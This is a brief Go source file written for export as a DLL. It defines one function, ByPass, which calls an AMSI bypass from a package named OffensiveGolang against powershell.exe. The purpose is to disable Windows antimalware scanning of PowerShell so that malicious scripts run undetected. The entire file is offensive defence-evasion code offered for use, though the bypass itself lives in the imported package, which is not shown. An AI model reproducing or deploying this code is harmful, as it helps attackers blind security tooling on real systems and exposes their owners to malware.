package main

import "C"
import (
	"github.com/MrTuxx/OffensiveGolang/pkg/evasion"
)

//export ByPass
func ByPass() {
	evasion.AMSIByPass("powershell.exe")
}

func main() {
	// Blank
}
